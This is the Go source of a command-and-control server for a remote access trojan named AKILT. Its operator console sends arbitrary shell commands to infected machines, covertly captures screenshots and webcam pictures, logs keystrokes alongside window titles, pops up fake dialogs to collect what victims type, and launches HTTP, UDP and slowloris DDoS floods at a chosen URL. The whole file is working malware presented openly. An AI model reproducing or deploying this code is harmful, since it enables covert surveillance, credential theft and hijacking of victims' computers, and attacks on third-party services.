package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	tm "github.com/buger/goterm"

	"github.com/Xart3mis/AKILT/Server/lib/bundles"
	"github.com/Xart3mis/AKILTC/pb"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"

	"github.com/gookit/color"
	"github.com/peterh/liner"
	"github.com/schollz/progressbar/v3"
)

type server struct {
	pb.ConsumerServer
}

type floodParams struct {
	Type        int
	url         *url.URL
	num_threads int64
	limit       time.Duration
}

type DialogParams struct {
	ShouldUpdate bool
	DialogPrompt string
	DialogTitle  string
}

var flood_params *floodParams = nil
var dialog_params *DialogParams = nil

var current_id string = ""

var client_ids []string
var client_mapids map[int]string = make(map[int]string)

var client_onscreentext map[string]string = make(map[string]string)

var client_execcommand map[string]string = make(map[string]string)
var client_execoutput map[string]string = make(map[string]string)

var client_dialogoutput map[string]string = make(map[string]string)

var should_screenshot bool = false
var should_takepic bool = false

var exec_done bool
var dialog_done bool

var timeout int = 30

var connect_header string = ""
var disconnect_header string = ""

var (
	history_fn = filepath.Join(os.TempDir(), ".liner_history")
	commands   = []string{
		"list_clients",
		"screenshot",
		"settimeout",
		"cleartext",
		"settext",
		"select",
		"dialog",
		"flood",
		"clear",
		"exec",
		"help",
		"exit",
		"pic",
	}
)

var flood_completed bool

var banner string = `
▄▄▄       ██ ▄█▀ ██▓ ██▓    ▄▄▄█████▓
▒████▄     ██▄█▒ ▓██▒▓██▒    ▓  ██▒ ▓▒
▒██  ▀█▄  ▓███▄░ ▒██▒▒██░    ▒ ▓██░ ▒░
░██▄▄▄▄██ ▓██ █▄ ░██░▒██░    ░ ▓██▓ ░ 
 ▓█   ▓██▒▒██▒ █▄░██░░██████▒  ▒██▒ ░ 
 ▒▒   ▓▒█░▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░  ▒ ░░   
  ▒   ▒▒ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░    ░    
  ░   ▒   ░ ░░ ░  ▒ ░  ░ ░     ░      
      ░  ░░  ░    ░      ░  ░         
`

func init() {
	tm.Clear()
	tm.MoveCursor(1, 1)
	tm.Flush()
}

func main() {
	go func() {
		creds, err := loadTLSCredentials()
		if err != nil {
			log.Fatalln(err)
		}

		s := grpc.NewServer(grpc.Creds(creds))
		lis, err := net.Listen("tcp", ":8000")
		if err != nil {
			log.Fatalf("Failed to listen: %v", err)
		}

		pb.RegisterConsumerServer(s, &server{})

		err = s.Serve(lis)
		if err != nil {
			log.Fatalf("Failed to serve: %v", err)
		}
	}()

	color.HiRed.Println(banner)

	line := liner.NewLiner()
	defer line.Close()

	line.SetCtrlCAborts(true)
	line.SetCompleter(func(line string) (c []string) {
		for _, n := range commands {
			if strings.HasPrefix(n, strings.ToLower(line)) {
				c = append(c, n)
			}
		}
		return
	})

	if f, err := os.Open(history_fn); err == nil {
		line.ReadHistory(f)
		f.Close()
	}

	log.SetFlags(0)

	for {
		go func() {
			if len(connect_header) > 0 {
				color.Green.Println(tm.ResetLine(connect_header))
				connect_header = ""
				tm.Flush()
			}

			if len(disconnect_header) > 0 {
				color.Red.Println(tm.ResetLine(disconnect_header))
				disconnect_header = ""
				tm.Flush()
			}
		}()

		in, err := line.Prompt(">> ")
		if err == liner.ErrPromptAborted {
			log.Print("Aborted")
			break
		} else if err != nil {
			log.Print("Error reading line: ", err)
			break
		}

		line.AppendHistory(in)

		in = strings.TrimSpace(in)

		fields := strings.Fields(in)

		if len(fields) > 0 {
			switch fields[0] {
			case "exit":
				goto exit

			case "help":
				if len(fields[1:]) == 0 {
					log.Println("available commands:")
					for idx := range commands {
						color.Green.Println(commands[idx])
					}
					color.Yellow.Println(
						"to see the help page for a specific command type [help <command>]",
					)
				} else {
					var found_command bool

					for idx := range commands {
						if fields[1] == commands[idx] {
							found_command = true
							break
						}
					}

					if !found_command {
						color.Red.Println("command not found.")
						continue
					}

					switch fields[1] {
					case "list_clients":
						color.Green.Print("list_clients: ")
						log.Println("lists the currently connected clients.")
						color.Gray.Println("usage: [list_clients]")
					case "screenshot":
						color.Green.Print("screenshot: ")
						log.Println("takes a screenshot of client screen.")
						color.Gray.Println("usage: [screenshot]")
					case "settext":
						color.Green.Print("settext: ")
						log.Println("shows text on client screen.")
						color.Gray.Println("usage: [settext <text>]")
					case "cleartext":
						color.Green.Print("cleartext: ")
						log.Println("clears the text that's on the client screen")
						color.Gray.Println("usage: [cleartext]")
					case "select":
						color.Green.Print("select: ")
						log.Println("selects a client by its index. ")
						color.Gray.Println("usage: [select <client index>]")
					case "dialog":
						color.Green.Print("dialog: ")
						log.Println("shows a text entry dialog on client computer. ")
						color.Gray.Println("usage: [dialog \"<dialog title>\" \"<dialog prompt>\"]")
					case "exec":
						color.Green.Print("exec: ")
						log.Println("executes a command on client computer. ")
						color.Gray.Println("usage: [exec <command>]")
					case "exit":
						color.Green.Print("exit: ")
						log.Println("closes the C2 server. ")
						color.Gray.Println("usage: [exit]")
					case "flood":
						color.Green.Print("flood: ")
						log.Println("performs a DDOS attack against a specified target. (methods are: httpflood, udpflood, slowloris)")
						color.Gray.Println("usage: [flood <target url> <seconds> <worker count> <method>]")
					case "pic":
						color.Green.Print("pic: ")
						log.Println("takes a picture through the clients' webcam. ")
						color.Gray.Println("usage: [pic]")
					case "clear":
						color.Green.Print("clear: ")
						log.Println("clears the terminal screen.")
						color.Gray.Println("usage: [clear]")
					case "settimeout":
						color.Green.Print("settimeout: ")
						log.Println("sets the timeout for dialog and exec commands.")
						color.Gray.Println("usage: [settimeout <timeout>]")
					}
				}

			case "flood":
				if len(fields[1:]) < 4 {
					color.Red.Println("not enough arguments to flood.")
					continue
				}

				if current_id == "" {
					color.Red.Println("please select a client first.")
					continue
				}

				var isUrl func(string) bool = func(str string) bool {
					url, err := url.ParseRequestURI(str)
					if err != nil {
						return false
					}

					address := net.ParseIP(url.Host)
					if address == nil {
						return strings.Contains(url.Host, ".")
					}

					return true
				}

				target, err := url.Parse(fields[1])
				if !isUrl(target.String()) || err != nil {
					color.Red.Println("invalid target url.")
					continue
				}

				limit, err := strconv.Atoi(fields[2])
				if err != nil {
					color.Red.Println("invalid time limit.")
					continue
				}

				workersN, err := strconv.ParseInt(fields[3], 10, 64)
				if err != nil {
					color.Red.Println("invalid worker count")
					continue
				}

				if fields[4] != "httpflood" && fields[4] != "udpflood" && fields[4] != "slowloris" {
					color.Red.Println("invalid flood method.")
					continue
				}

				FloodCommand(target, time.Duration(limit)*time.Second, workersN, fields[4])

			case "select":
				if len(fields[1:]) > 1 {
					color.Red.Println("select only takes one argument.")
					continue
				}

				if len(fields[1:]) < 1 {
					color.Red.Println("select takes one argument.")
					continue
				}

				client_idx, err := strconv.Atoi(fields[1])
				if err != nil {
					color.Red.Println("invalid client index.")
					continue
				}

				if Contains(client_ids, client_mapids[client_idx]) {
					current_id = client_mapids[client_idx]
					ShowOk()
				} else {
					color.Red.Println("invalid client index.")
					continue
				}

			case "settext":
				if len(fields[1:]) < 1 {
					color.Red.Println("settext takes multiple arguments")
					continue
				}

				if current_id != "" {
					client_onscreentext[current_id] = strings.Join(fields[1:], " ")
					ShowOk()
				} else {
					color.Red.Println("please select a client first.")
					continue
				}

			case "screenshot":
				if current_id == "" {
					color.Red.Println("please select a client first.")
					continue
				}

				should_screenshot = true
				ShowOk()

			case "pic":
				if current_id == "" {
					color.Red.Println("please select a client first.")
					continue
				}

				should_takepic = true
				ShowOk()

			case "cleartext":
				if current_id == "" {
					color.Red.Println("please select a client first.")
					continue
				}

				client_onscreentext[current_id] = ""

			case "list_clients":
				if len(fields[1:]) > 0 {
					color.Red.Println("list_clients takes no arguments.")
					continue
				}

				b, _ := json.MarshalIndent(client_mapids, "", "\t")
				color.Magenta.Println(string(b))

			case "settimeout":
				if len(fields[1:]) != 1 {
					color.Red.Println("settimeout takes one argument.")
					continue
				}

				val, err := strconv.Atoi(fields[1])
				if err != nil {
					color.Red.Println("not a valid timeout.")
					continue
				}

				timeout = val

				ShowOk()

			case "exec":
				if len(fields[1:]) < 1 {
					color.Red.Println("exec takes multiple arguments.")
					continue
				}

				if current_id == "" {
					color.Red.Println("please select a client first.")
					continue
				}

				client_execcommand[current_id] = strings.Join(fields[1:], " ")

				exec_done = false

				ctx, cancel := context.WithTimeout(
					context.Background(),
					time.Duration(timeout)*time.Second,
				)

				wait_exec := func() {
					for {
						select {
						case <-ctx.Done():
							color.Red.Println("exec timed out.")
							client_execoutput[current_id] = ""
							return
						default:
							if exec_done {
								return
							}
						}
					}
				}

				wait_exec()
				cancel()

				log.Println(client_execoutput[current_id])
				client_execoutput[current_id] = ""

			case "dialog":
				if current_id == "" {
					color.Red.Println("please select a client first.")
					continue
				}

				if len(fields[1:]) < 1 {
					color.Red.Println("dialog takes multiple arguments.")
					continue
				}

				r := regexp.MustCompile(`\".*?\"`)
				matches := r.FindAllString(strings.Join(fields[1:], " "), -1)

				for idx := range matches {
					matches[idx] = strings.ReplaceAll(matches[idx], "\"", "")
				}

				if len(matches) > 2 {
					color.Red.Println("dialog only takes two arguments")
				}

				dialog_params = &DialogParams{
					ShouldUpdate: true,
					DialogPrompt: matches[0],
					DialogTitle:  matches[1],
				}

				dialog_done = false

				ctx, cancel := context.WithTimeout(
					context.Background(),
					time.Duration(timeout)*time.Second,
				)

				wait_dialog := func() {
					for {
						select {
						case <-ctx.Done():
							color.Red.Println("dialog timed out.")
							client_dialogoutput[current_id] = ""
							return
						default:
							if dialog_done {
								return
							}
						}
					}
				}

				wait_dialog()
				cancel()

				log.Println(client_dialogoutput[current_id])
				client_dialogoutput[current_id] = ""

			case "clear":
				tm.Clear()
				tm.MoveCursor(1, 1)
				tm.Flush()

				color.HiRed.Println(banner)
				fmt.Println()

			default:
				color.Red.Println("unknown command.")
			}

			tm.Flush()
		}
	}

exit:
	if f, err := os.Create(history_fn); err != nil {
		log.Print("Error writing history file: ", err)
	} else {
		line.WriteHistory(f)
		f.Close()
	}
}

func FloodCommand(target *url.URL, limit time.Duration, workersN int64, method string) {
	log.Println(
		color.Green.Sprintf(
			"flooding %s for %s seconds with %d workers using %s method",
			target.String(),
			limit,
			workersN,
			method,
		),
	)

	var floodtype int
	switch method {
	case "httpflood":
		floodtype = 1
	case "udpflood":
		floodtype = 2
	case "slowloris":
		floodtype = 0
	default:
		floodtype = -1
	}

	flood_params = &floodParams{Type: floodtype, url: target, num_threads: workersN, limit: limit}

	go func() {
		time.Sleep(limit)
		flood_completed = true
	}()
	bar := progressbar.NewOptions(
		-1,
		progressbar.OptionClearOnFinish(),
		progressbar.OptionFullWidth(),
	)
	for !flood_completed {
		bar.Add(1)
	}
	log.Println()
}

func ShowOk() {
	color.HiGreen.Println("Ok.")
}

func loadTLSCredentials() (credentials.TransportCredentials, error) {
	bundles.WriteCert()
	bundles.WriteCertKey()
	// Load server's certificate and private key
	serverCert, err := tls.LoadX509KeyPair("./server-cert.pem", "./server-key.pem")
	if err != nil {
		return nil, err
	}

	// Create the credentials and return it
	config := &tls.Config{
		Certificates:       []tls.Certificate{serverCert},
		ClientAuth:         tls.NoClientCert,
		InsecureSkipVerify: true,
	}

	return credentials.NewTLS(config), nil
}

func Contains(sl []string, name string) bool {
	for _, value := range sl {
		if value == name {
			return true
		}
	}
	return false
}

func (s *server) GetCommand(
	ctx context.Context,
	cid *pb.ClientDataRequest,
) (*pb.ClientExecData, error) {
	if !Contains(client_ids, cid.ClientId) {
		client_ids = append(client_ids, cid.ClientId)
	}

	if cid.ClientId == current_id && cid != nil {
		x := client_execcommand[current_id]
		client_execcommand[current_id] = ""
		return &pb.ClientExecData{
			ShouldExec: len(x) > 0,
			Command:    x}, nil
	}
	return &pb.ClientExecData{}, nil
}

func (s *server) SetCommandOutput(ctx context.Context, in *pb.ClientExecOutput) (*pb.Void, error) {
	if id := in.GetId(); id != nil {
		if id.ClientId == current_id {
			client_execoutput[current_id] = ""
			client_execoutput[current_id] = string(in.GetOutput())
			exec_done = true
		}
	}

	return &pb.Void{}, nil
}

func (s *server) SubscribeOnScreenText(
	r *pb.ClientDataRequest,
	in pb.Consumer_SubscribeOnScreenTextServer,
) error {
	if !Contains(client_ids, r.ClientId) {
		client_ids = append(client_ids, r.ClientId)
	}
	for {
		if r.GetClientId() == current_id {
			in.Send(&pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
				ShouldUpdate: len(client_onscreentext[current_id]) > 0,
				OnScreenText: client_onscreentext[current_id]}})
		} else {
			in.Send(&pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
				ShouldUpdate: false,
				OnScreenText: ""}})
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func (s *server) GetFlood(ctx context.Context, in *pb.Void) (*pb.FloodData, error) {
	if flood_params != nil {
		x := flood_params
		flood_params = nil
		return &pb.FloodData{
			FloodType:   int32(x.Type),
			ShouldFlood: true,
			Url:         x.url.String(),
			Limit:       int64(x.limit.Seconds()),
			NumThreads:  x.num_threads}, nil
	}

	return &pb.FloodData{ShouldFlood: false}, nil
}

func (s *server) GetDialog(ctx context.Context, in *pb.ClientDataRequest) (*pb.DialogData, error) {
	if !Contains(client_ids, in.ClientId) {
		client_ids = append(client_ids, in.ClientId)
	}

	if dialog_params != nil {
		x := dialog_params
		dialog_params = nil

		if in.GetClientId() == current_id {
			return &pb.DialogData{
				ShouldShowDialog: x.ShouldUpdate,
				DialogTitle:      x.DialogTitle,
				DialogPrompt:     x.DialogPrompt}, nil
		}
	}

	return &pb.DialogData{ShouldShowDialog: false}, nil
}

func (s *server) SetDialogOutput(ctx context.Context, in *pb.DialogOutput) (*pb.Void, error) {
	if id := in.GetId(); id != nil {
		if id.ClientId == current_id {
			client_dialogoutput[current_id] = ""
			client_dialogoutput[current_id] = in.GetEntryText()
		}
	}

	dialog_done = true

	return &pb.Void{}, nil
}

func (s *server) GetScreen(ctx context.Context, in *pb.ClientDataRequest) (*pb.ScreenData, error) {
	if in.ClientId == current_id {
		ss := should_screenshot
		should_screenshot = false
		return &pb.ScreenData{ShouldTakeScreenshot: ss}, nil
	}
	return &pb.ScreenData{ShouldTakeScreenshot: false}, nil
}

func (s *server) SetScreenOutput(ctx context.Context, in *pb.ScreenOutput) (*pb.Void, error) {
	if !Contains(client_ids, in.Id.ClientId) {
		client_ids = append(client_ids, in.Id.ClientId)
	}

	if in.Id.ClientId == current_id {
		var file *os.File

		defer file.Close()

		file, err := os.OpenFile(
			fmt.Sprintf("screenshot-%s.jpeg", in.Id.ClientId),
			os.O_CREATE|os.O_WRONLY,
			0644,
		)
		if err != nil {
			return &pb.Void{}, err
		}

		file.Write(in.ImageData)
	}

	return &pb.Void{}, nil
}

func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.Void, error) {
	if !Contains(client_ids, in.Id.ClientId) {
		client_ids = append(client_ids, in.Id.ClientId)
	}

	var file *os.File

	file, err := os.OpenFile(
		fmt.Sprintf("keylog-%s.log", in.Id.ClientId),
		os.O_APPEND|os.O_CREATE|os.O_WRONLY,
		0644,
	)
	if err != nil {
		return &pb.Void{}, err
	}

	defer file.Close()

	file.WriteString(fmt.Sprintf("%s - %s\n", in.GetWindowTitle(), string(rune(in.GetKey()))))

	return &pb.Void{}, nil
}

func (s *server) GetPicture(
	ctx context.Context,
	in *pb.ClientDataRequest,
) (*pb.PictureData, error) {
	if !Contains(client_ids, in.ClientId) {
		client_ids = append(client_ids, in.ClientId)
	}

	if in.ClientId == current_id {
		pic := should_takepic
		should_takepic = false
		return &pb.PictureData{ShouldTakePicture: pic}, nil
	}

	return &pb.PictureData{ShouldTakePicture: false}, nil
}

func (s *server) SetPictureOutput(ctx context.Context, in *pb.PictureOutput) (*pb.Void, error) {
	if !Contains(client_ids, in.Id.ClientId) {
		client_ids = append(client_ids, in.Id.ClientId)
	}

	if in.Id.ClientId == current_id {
		var file *os.File

		defer file.Close()
		file, err := os.OpenFile(
			fmt.Sprintf("webcam_pic-%s.jpg", in.Id.ClientId),
			os.O_CREATE|os.O_WRONLY,
			0644,
		)
		if err != nil {
			return &pb.Void{}, err
		}

		file.Write(in.PictureData)
	}

	return &pb.Void{}, nil
}

func (s *server) RegisterClient(ctx context.Context, in *pb.RegisterData) (*pb.Void, error) {
	connect_header = "\nclient connected with ip:" + in.GetIp() + " and pid:" + in.GetId().ClientId

	if !Contains(client_ids, in.Id.ClientId) {
		client_ids = append(client_ids, in.Id.ClientId)
	}

	for i, val := range client_ids {
		client_mapids[i] = val
	}

	return &pb.Void{}, nil
}

func (s *server) UnregisterClient(ctx context.Context, in *pb.RegisterData) (*pb.Void, error) {
	disconnect_header = "\nclient disconnected with ip:" + in.GetIp() + " and pid:" + in.GetId().ClientId

	for i, other := range client_ids {
		if other == in.Id.ClientId {
			delete(client_mapids, i)
			client_ids = append(client_ids[:i], client_ids[i+1:]...)
		}
	}

	return &pb.Void{}, nil
}
